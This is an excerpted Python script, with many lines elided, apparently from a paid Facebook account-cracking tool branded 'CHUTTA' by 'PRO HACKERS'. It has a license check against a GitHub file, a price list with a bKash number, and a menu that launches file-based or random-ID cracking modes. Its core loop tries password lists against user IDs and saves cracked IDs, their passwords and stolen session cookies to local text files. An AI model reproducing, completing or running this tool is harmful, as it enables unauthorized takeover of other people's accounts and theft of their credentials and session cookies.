...
try:
	...
	#os.system('git clone https://github.com/CHUTTA-KING)
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ PRO ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  PRO_         
               \033[1;91mFACEBOK      :  MD CHUTTA 
               \033[1;97mGITHUB       :  CHUTTA-KING      
               \033[1;91mSTATUS       :   PAID😈           
               \033[1;97mTEAM         :  PRO HACKERS                 
               \033[1;91mTOOL VIRSION :  0.01        
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/CHUTTA1/CHUTTA/blob/main/Active.txt').text
    if id in httpCaht:
      ...
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mFor 15 Days Approval Price 2$ One Month Price 5$")
      print('BKASH PERSONAL - +940781782648')
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://youtube.com/@jokargamsi=a_4jPxgIGl7qUup3')
		crack_file()
		
	if ot == '2':
		os.system('xdg-open https://youtube.com/@jokargamgIGl7qUup3')
		rndm()
		
	if ot == '3':
		os.system('xdg-open https://www.facebook.com/p4116257385')
		menu()
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[CHUTTA_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mCHUTTA KING-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m😈\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('CHUTTA-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('CHUTTA-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(CHUTTA-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('CHUTTA-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
        ...
        #sys.stdout.write('\r%s   [CHUTTA] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
